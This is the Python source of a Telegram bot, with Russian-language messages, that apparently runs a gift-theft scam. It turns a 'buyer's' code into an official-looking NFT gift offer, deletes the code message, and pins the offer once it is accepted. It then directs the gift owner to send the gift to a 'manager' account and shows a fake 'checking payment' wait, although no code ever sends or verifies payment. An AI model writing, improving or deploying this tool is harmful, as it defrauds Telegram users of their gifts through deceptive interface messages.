import asyncio
import os
import re
import random
import string
import aiosqlite
from datetime import datetime
from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandStart
from aiogram.types import (
    Message, 
    CallbackQuery, 
    InlineKeyboardMarkup, 
    InlineKeyboardButton
)
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN не найден!")

MANAGER_LINK = "tg://send_gift?to=Autooffersgift"
STARS_TO_USD = 0.013

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())


class OfferState(StatesGroup):
    waiting_for_data = State()


async def init_db():
    async with aiosqlite.connect("offers.db") as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS offers (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                code TEXT UNIQUE,
                order_id TEXT,
                gift TEXT,
                amount INTEGER,
                currency TEXT,
                buyer_id INTEGER,
                buyer_username TEXT,
                status TEXT DEFAULT 'pending',
                created_at TEXT
            )
        """)
        await db.commit()


def generate_code(length=5):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))


def generate_order_id():
    return f"TG-{datetime.now().strftime('%y%m%d%H%M%S')[2:]}"


def make_offer_text(gift: str, amount: int, buyer_username: str | None = None) -> str:
    usd = round(amount * STARS_TO_USD, 2)
    gift_link = f"https://t.me/nft/{gift}"
    buyer = f"@{buyer_username}" if buyer_username else "Покупатель"

    return (
        f"✨ <b>Оффер</b>\n\n"
        f"👤 {buyer}\n"
        f"🎁 <a href=\"{gift_link}\"><b>{gift}</b></a>\n\n"
        f"⭐️ <b>{amount}</b> Stars  ·  ≈ ${usd}"
    )


def make_accepted_text(gift: str, amount: int, order_id: str) -> str:
    usd = round(amount * STARS_TO_USD, 2)
    gift_link = f"https://t.me/nft/{gift}"

    return (
        f"✅ <b>Принято</b>\n\n"
        f"🎁 <a href=\"{gift_link}\"><b>{gift}</b></a>\n"
        f"⭐️ <b>{amount}</b> Stars  ·  ≈ ${usd}\n"
        f"📄 <code>{order_id}</code>\n\n"
        f"Передайте подарок менеджеру 👇"
    )


def make_waiting_text(amount: int) -> str:
    usd = round(amount * STARS_TO_USD, 2)
    return (
        f"⏳ <b>Проверяем поступление</b>\n\n"
        f"Ожидание: до 30 минут\n"
        f"⭐️ <b>{amount}</b> Stars  ·  ≈ ${usd}"
    )


def offer_keyboard(offer_id: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="✅ Принять", callback_data=f"accept:{offer_id}"),
            InlineKeyboardButton(text="❌ Отклонить", callback_data=f"decline:{offer_id}")
        ]
    ])


def accepted_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎁 Передать подарок", url=MANAGER_LINK)],
        [InlineKeyboardButton(text="✅ Подтвердить передачу", callback_data="confirm_transfer")]
    ])


@dp.message(CommandStart())
async def cmd_start(message: Message):
    await message.answer("👋 Бот офферов\n\nНапиши /offer чтобы создать оффер")


@dp.message(Command("offer"))
async def cmd_offer(message: Message, state: FSMContext):
    await state.set_state(OfferState.waiting_for_data)
    await message.answer("Кидай данные:\n<code>SnoopCigar-84846 3200 stars</code>")


@dp.message(OfferState.waiting_for_data)
async def process_offer_data(message: Message, state: FSMContext):
    match = re.match(r"^([A-Za-z0-9]+-\d+)\s+(\d+)\s+(stars?|grams?)$", message.text.strip(), re.IGNORECASE)
    if not match:
        await message.answer("Неверный формат. Пример:\n<code>SnoopCigar-84846 3200 stars</code>")
        return

    gift = match.group(1)
    amount = int(match.group(2))
    currency = "stars" if match.group(3).lower().startswith("star") else "grams"

    code = generate_code()
    order_id = generate_order_id()

    async with aiosqlite.connect("offers.db") as db:
        await db.execute(
            """INSERT INTO offers (code, order_id, gift, amount, currency, buyer_id, buyer_username, status, created_at)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (code, order_id, gift, amount, currency, message.from_user.id,
             message.from_user.username, "pending", datetime.now().isoformat())
        )
        await db.commit()

    await state.clear()
    await message.answer(f"Код готов:\n\n<code>{code}</code>\n\nКинь этот код в чат с владельцем подарка.")


@dp.message(F.text.regexp(r"^[A-Z0-9]{5}$"))
async def handle_code(message: Message):
    code = message.text.strip().upper()

    async with aiosqlite.connect("offers.db") as db:
        async with db.execute(
            "SELECT id, gift, amount, buyer_username, order_id FROM offers WHERE code = ? AND status = 'pending'",
            (code,)
        ) as cursor:
            offer = await cursor.fetchone()

    if not offer:
        return

    offer_id, gift, amount, buyer_username, order_id = offer

    try:
        await message.delete()
    except Exception:
        pass

    text = make_offer_text(gift, amount, buyer_username)
    kb = offer_keyboard(offer_id)
    await message.answer(text, reply_markup=kb, disable_web_page_preview=False)

    async with aiosqlite.connect("offers.db") as db:
        await db.execute("UPDATE offers SET status = 'sent' WHERE id = ?", (offer_id,))
        await db.commit()


@dp.callback_query(F.data.startswith("accept:"))
async def accept_offer(callback: CallbackQuery):
    offer_id = int(callback.data.split(":")[1])

    async with aiosqlite.connect("offers.db") as db:
        async with db.execute("SELECT gift, amount, order_id FROM offers WHERE id = ?", (offer_id,)) as cursor:
            offer = await cursor.fetchone()

    if not offer:
        await callback.answer("Оффер не найден", show_alert=True)
        return

    gift, amount, order_id = offer
    text = make_accepted_text(gift, amount, order_id)
    kb = accepted_keyboard()

    await callback.message.edit_text(text, reply_markup=kb)
    await callback.answer("✅ Принято")

    try:
        await bot.pin_chat_message(callback.message.chat.id, callback.message.message_id)
    except Exception:
        pass

    async with aiosqlite.connect("offers.db") as db:
        await db.execute("UPDATE offers SET status = 'accepted' WHERE id = ?", (offer_id,))
        await db.commit()


@dp.callback_query(F.data.startswith("decline:"))
async def decline_offer(callback: CallbackQuery):
    await callback.message.edit_text("❌ Отклонено")
    await callback.answer()


@dp.callback_query(F.data == "confirm_transfer")
async def confirm_transfer(callback: CallbackQuery):
    async with aiosqlite.connect("offers.db") as db:
        async with db.execute("SELECT amount FROM offers WHERE status = 'accepted' ORDER BY id DESC LIMIT 1") as cursor:
            row = await cursor.fetchone()

    amount = row[0] if row else 0
    await callback.message.answer(make_waiting_text(amount))
    await callback.answer()


async def health_handler(request):
    return web.Response(text="Bot is running")


async def start_web_server():
    app = web.Application()
    app.router.add_get("/", health_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.getenv("PORT", 10000))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()


async def main():
    await init_db()
    await asyncio.gather(start_web_server(), dp.start_polling(bot))


if __name__ == "__main__":
    asyncio.run(main())
